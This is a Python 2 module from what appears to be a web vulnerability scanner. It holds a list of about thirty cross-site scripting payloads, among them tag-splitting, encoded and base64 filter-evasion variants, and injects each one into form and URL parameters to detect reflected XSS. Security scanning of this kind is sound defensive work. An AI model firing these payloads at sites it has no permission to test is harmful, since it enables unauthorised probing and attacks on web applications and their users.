from utils import create_form_selector, update_url_params, get_url_host, get_form_params, get_url_query, SCRIPTABLE_ATTRS, POST, GET
from urlparse import urlparse, urlunparse, parse_qsl, urljoin
from urllib import urlencode
from client import NotAPage, RedirectedToExternal

import requests
import copy
import sys
import time

XSS_STRING = "alert('xssed')"
INJECTIONS = (
    "\"><script>alert('xssed')</script>",
    "\"><sCriPt>alert('xssed')</sCriPt>",
    "\"; alert('xssed')",
    "\"></sCriPt><sCriPt >alert('xssed')</sCriPt>",
    "\"><img Src=0x94 onerror=alert('xssed')>",
    "\"><BODY ONLOAD=alert('xssed')>",
    "'%2Balert('xssed')%2B'",
    "\"><'xssed'>",
    "'+alert('xssed')+'",
    "%2Balert('xssed')%2B'",
    "'\"--></style></script><script>alert('xssed')</script>",
    "'</style></script><script>alert('xssed')</script>",
    "</script><script>alert('xssed')</script>",
    "</style></script><script>alert('xssed')</script>",
    "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94('xssed')%3C",
    "'\"--></style></script><script>alert('xssed')</script>",
    "';alert('xssed')'",
    "<scr<script>ipt>alert('xssed')</script>",
    "<scr<script>ipt>alert('xssed')</scr</script>ipt>",
    "\"<scr<script>ipt>alert('xssed')</scr</script>ipt>",
    "\"><scr<script>ipt>alert('xssed')</script>",
    "\">'</style></script><script>alert('xssed')</script>",
    "\"></script><script>alert('xssed')</script>",
    "\"></style></script><script>alert('xssed')</script>",
    "<IMG SRC=\" &#14;  javascript:alert('xssed');\">",
    "</title>\"><a href=\"javascript:alert('xssed');\">",
    "</title>\"><iframe onerror=\"alert('xssed');\" src=x></iframe>",
    "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzZWQnKTwvc2NyaXB0Pg==\">",
    "<img src=x onerror=alert('xssed')>",
    "<scri%00pt>alert('xssed');</scri%00pt>",
    "<svg/onload=alert('xssed');>",
    "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KCd4c3NlZCcpPg==\">"
)

def xss(page, client):
    print "Testing for XSS in page {}".format(page.url)
    parsed_url = urlparse(page.url)

    url_xss_report = hpp(page.url, client)

    for form in page.get_forms():
        report = {}
        action = urljoin(page.url, form.get('action'))

        if get_url_host(page.url) != get_url_host(action):
            continue

        method = form.get('method') or GET
        injectable, immutable = get_form_params(form)

        for param in injectable.keys():
            successed = []

            for injection in INJECTIONS:
                inject = inject_param(injectable, param, injection)
                inject.update(immutable)

                try:
                    if method.lower() == POST.lower():
                        res_page = client.post(action, data=inject)
                    else:
                        injected_url = update_url_params(action, inject)
                        res_page = client.get(injected_url)
                except NotAPage:
                    continue
                except RedirectedToExternal:
                    continue

                result = res_page.document.find_all(contains_injection)
                if result:
                    successed.append(injection)

            if successed:
                report.update({param: successed})
        if report:
            print 'Cross Site Scripting (XSS) in url {} on form {}. params {}'.format(page.url, form.get('action'), report.keys())

def contains_injection(tag):
    return any(k in SCRIPTABLE_ATTRS and XSS_STRING in v \
        or k in ('src', 'href') and "javascript:alert('xssed')" in v for k, v in tag.attrs.iteritems()) \
        or tag.name == 'script' and list(tag.strings) and XSS_STRING in list(tag.strings)[0]

def inject_param(parameters, param, injection):
    injected = copy.deepcopy(parameters)
    injected[param] += injection
    return injected

def hpp(url, client):
    """HTTP Parameter Pollution (HPP)"""
    query = get_url_query(url)
    report = {}

    for param, value in query.iteritems():
        successed = []
        for injection in INJECTIONS:
            injected_url = update_url_params(url, {param: value + injection})
            try:
                res_page = client.get(injected_url)
            except NotAPage:
                continue
            except RedirectedToExternal:
                continue
            result = res_page.document.find_all(contains_injection)

            if result:
                successed.append(injection)

        if successed:
            report.update({param: successed})

    if report:
        print 'HTTP Parameter Pollution in url {}. params {}'.format(url, report.keys())

    return report
